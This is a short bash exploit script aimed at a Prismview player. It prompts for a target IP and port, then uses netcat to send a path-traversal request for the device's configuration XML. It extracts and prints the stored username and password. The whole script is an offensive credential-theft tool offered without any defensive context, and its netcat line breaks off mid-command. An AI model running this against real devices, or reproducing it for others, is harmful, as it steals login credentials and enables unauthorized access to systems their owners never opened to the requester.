#!/bin/bash

read -p "Enter host ip: " host
read -p "Enter port: " port

xml=$(echo -e "GET /../PrismviewV9-Player-006.xml HTTP/1.0\r\n" | nc -q 5 $h>


username=$(echo "$xml" | grep -oP '(?<=<UserName>).*(?=</UserName>)')
password=$(echo "$xml" | grep -oP '(?<=<Password>).*(?=</Password>)')

echo "Username: $username Password: $password"



